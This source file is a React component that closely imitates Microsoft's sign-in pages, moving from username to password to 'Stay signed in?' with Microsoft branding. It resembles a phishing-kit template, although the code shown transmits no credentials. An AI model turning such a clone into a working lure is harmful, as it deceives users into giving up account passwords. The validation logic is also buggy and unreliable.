import React, { useState } from 'react';
import './Signin.module.css'; // Assuming you're using CSS Modules

const SignInPage: React.FC = () => {
    const [view, setView] = useState<'uname' | 'pwd' | 'final'>('uname');
    const [unameVal, setUnameVal] = useState<boolean>(false);
    const [pwdVal, setPwdVal] = useState<boolean>(false);

    const unReq = "Enter a valid email address, phone number, or Skype name.";
    const pwdReq = "Please enter the password for your Microsoft account.";

    const validate = () => {
        const unameInp = document.getElementById('inp_uname') as HTMLInputElement;
        const pwdInp = document.getElementById('inp_pwd') as HTMLInputElement;
        
        if (view === 'uname') {
            if (unameInp.value.trim() === "") {
                document.getElementById('error_uname')!.innerText = unReq;
                unameInp.classList.add('error-inp');
                setUnameVal(false);
            } else {
                document.getElementById('error_uname')!.innerText = "";
                unameInp.classList.remove('error-inp');
                setUnameVal(true);
            }
            unameInp.addEventListener('change', () => {
                if (unameInp.value.trim() === "") {
                    document.getElementById('error_uname')!.innerText = unReq;
                    unameInp.classList.add('error-inp');
                    setUnameVal(false);
                } else {
                    document.getElementById('error_uname')!.innerText = "";
                    unameInp.classList.remove('error-inp');
                    setUnameVal(true);
                }
            });
        } else if (view === 'pwd') {
            if (pwdInp.value.trim() === "") {
                document.getElementById('error_pwd')!.innerText = pwdReq;
                pwdInp.classList.add('error-inp');
                setPwdVal(false);
            } else {
                document.getElementById('error_pwd')!.innerText = "";
                pwdInp.classList.remove('error-inp');
                setPwdVal(true);
            }
            pwdInp.addEventListener('change', () => {
                if (pwdInp.value.trim() === "") {
                    document.getElementById('error_pwd')!.innerText = pwdReq;
                    pwdInp.classList.add('error-inp');
                    setPwdVal(false);
                } else {
                    document.getElementById('error_pwd')!.innerText = "";
                    pwdInp.classList.remove('error-inp');
                    setPwdVal(true);
                }
            });
        }
    };

    return (
        <>
            <section id="section_uname" className={view === 'uname' ? '' : 'd-none'}>
                <div className="auth-wrapper">
                    <img src="assets/logo.png" alt="Microsoft" />
                    <h2 className="title mb-16 mt-16">Sign in</h2>
                    <form>
                        <div className="mb-16">
                            <p id="error_uname" className="error"></p>
                            <input
                                id="inp_uname"
                                type="text"
                                name="uname"
                                className="input"
                                placeholder="Email, phone, or Skype"
                            />
                        </div>
                    </form>
                    <div>
                        <p className="mb-16 fs-13">No account? <a href="" className="link">Create one!</a></p>
                        <p className="mb-16 fs-13">
                            <a href="#" className="link">Sign in with a security key
                                <img src="assets/question.png" alt="Question img" />
                            </a>
                        </p>
                    </div>
                    <div>
                        <button
                            className="btn"
                            id="btn_next"
                            onClick={() => {
                                validate();
                                if (unameVal) {
                                    setView('pwd');
                                }
                            }}
                        >
                            Next
                        </button>
                    </div>
                </div>
                <div className="opts">
                    <p className="has-icon mb-0" style={{ fontSize: '15px' }}>
                        <span className="icon">
                            <img src="assets/key.png" width="30px" alt="Key icon" />
                        </span>
                        Sign-in options
                    </p>
                </div>
            </section>

            <section id="section_pwd" className={view === 'pwd' ? '' : 'd-none'}>
                <div className="auth-wrapper">
                    <img src="assets/logo.png" alt="Microsoft" className="d-block" />
                    <div className="identity w-100 mt-16 mb-16">
                        <button className="back">
                            <img src="assets/back.png" alt="Back" />
                        </button>
                        <span id="user_identity">a@b.com</span>
                    </div>
                    <h2 className="title mb-16">Enter password</h2>
                    <form>
                        <div className="mb-16">
                            <p id="error_pwd" className="error"></p>
                            <input
                                id="inp_pwd"
                                type="password"
                                name="pass"
                                className="input"
                                placeholder="Password"
                            />
                        </div>
                    </form>
                    <div>
                        <p className="mb-16"> <a href="#" className="link fs-13">Forgot password?</a></p>
                        <p className="mb-16">
                            <a href="#" className="link fs-13">Other ways to sign in</a>
                        </p>
                    </div>
                    <div>
                        <button
                            className="btn"
                            id="btn_sig"
                            onClick={() => {
                                validate();
                                if (pwdVal) {
                                    setView('final');
                                }
                            }}
                        >
                            Sign in
                        </button>
                    </div>
                </div>
            </section>

            <section id="section_final" className={view === 'final' ? '' : 'd-none'}>
                <div className="auth-wrapper">
                    <img src="assets/logo.png" alt="Microsoft" className="d-block" />
                    <div className="identity w-100 mt-16 mb-16">
                        <span id="user_identity">a@b.com</span>
                    </div>
                    <h2 className="title mb-16">Stay signed in?</h2>
                    <p className="p">Stay signed in so you don't have to sign in again next time.</p>
                    <label className="has-checkbox">
                        <input type="checkbox" className="checkbox" />
                        <span>Don't show this again</span>
                    </label>
                    <div className="btn-group">
                        <button
                            className="btn btn-sec"
                            id="btn_final"
                            onClick={() => window.open(location.href, '_self').close()}
                        >
                            No
                        </button>
                        <button
                            className="btn"
                            id="btn_final"
                            onClick={() => window.open(location.href, '_self').close()}
                        >
                            Yes
                        </button>
                    </div>
                </div>
            </section>

            <footer className="footer">
                <a href="#">Terms of use</a>
                <a href="#">Privacy & cookies</a>
                <span>.&nbsp;.&nbsp;.</span>
            </footer>
        </>
    );
};

export default SignInPage;
